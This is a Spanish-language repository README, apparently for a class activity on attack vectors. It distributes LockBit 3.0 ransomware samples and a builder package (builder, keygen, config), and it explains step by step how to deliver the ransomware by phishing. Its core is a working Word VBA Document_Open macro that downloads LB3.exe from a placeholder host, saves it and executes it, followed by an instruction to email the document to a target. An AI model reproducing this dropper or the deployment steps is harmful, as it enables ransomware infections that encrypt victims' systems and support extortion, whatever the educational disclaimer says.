# Vectores de Ataque
Información para Actividad Vectores de Ataque

# ⚠️DESCARGO DE RESPONSABILIDAD

Este proyecto solo se puede utilizar con fines educativos. El uso de este software contra sistemas de destino sin permiso previo es ilegal y el autor no se hará responsable de los daños que se produzcan por el uso indebido de este software o componentes cargados en este repositorio.

Informe de análisis en Sandbox de la muestra LB3.exe (Lockbit) - LB3_exe_Malicious activity _ ANY_RUN - Malware Sandbox Online.7z

Informe de análisis en Sandbox de la muestra ctrsys.exe (Lockbit) - ctrsys_exe_Malicious activity _ ANY_RUN - Malware Sandbox Online.7z

Carga Maliciosa crtsys.exe - Muestra_crtsys_exe_Lockbit.zip

Carga Maliciosa LB3.exe - Muestra_LB3_exe_Lockbit.zip

# Lockbit - Main
El archivo LockBit-main.zip contiene los siguientes archivos

Construir.bat

constructor.exe

configuración.json

keygen.exe

Para probar LockBit 3.0 en un sistema, primero es necesario generar los archivos requeridos antes de su ejecución. Este proceso puede automatizarse mediante el archivo por lotes disponible en este repositorio. Una vez completado, existen diversas formas de acceder al sistema, muchas de las cuales están documentadas en guías en línea. A continuación, se describen los pasos para un par de estos métodos.

### Cómo acceder a un sistema con un esquema de phishing

En este caso, el ataque se inicia mediante un correo electrónico que contiene una solicitud de empleo. Al abrir el archivo adjunto en Microsoft Word y habilitar la edición, se activa la descarga y ejecución de LockBit 3.0. Aunque existe una guía en línea con más detalles, a continuación se presentan algunos consejos clave:

1. En Word, se debe ingresar al modo de desarrollo
2. Implementar la descarga y ejecución de LockBit 3.0 en la macro. Aquí hay una versión de la macro que implementa esto:

```
Sub Document_Open()

dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", "http://example.com/LB3.exe", False
xHttp.Send

with bStrm
    .type = 1 '//binary
    .open
    .write xHttp.responseBody
    .savetofile "c:\temp\LB3.exe", 2 '//overwrite
end with

CreateObject("WScript.Shell").Run "c:\temp\LB3.exe"

End Sub
```
3. Por último enviar el correo electrónico que contiene el documento y cuando el usuario lo abre y presiona "Habilitar edición", debe ejecutar LockBit 3.0

Referencia: https://github.com/Tennessene/LockBit/tree/main 
